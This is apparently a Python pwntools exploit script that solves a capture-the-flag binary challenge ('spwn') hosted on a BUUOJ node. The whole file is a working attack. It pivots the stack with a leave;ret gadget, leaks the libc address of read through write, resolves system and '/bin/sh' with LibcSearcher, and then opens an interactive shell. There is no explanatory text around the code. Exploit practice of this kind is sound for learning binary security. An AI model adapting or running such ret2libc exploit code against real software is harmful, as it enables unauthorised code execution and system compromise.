from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './spwn'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',25471) if argv[1]=='r' else process(binary)

# start
name = 0x804a300
leave_ret = 0x8048511 # mov esp,ebp; pop ebp
vuln = elf.sym['vul_function']

payload = flat('a'*4,elf.plt['write'],vuln,1,elf.got['read'],4)
sa('name?',payload)
sa('say?',flat('a'*0x18,name,leave_ret))
# esp = ebp; ebp = name
read = uu32(r(4))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*12,system,'a'*4,binsh)
sa('name?',payload)
sa('say?','blabla')
# end

itr()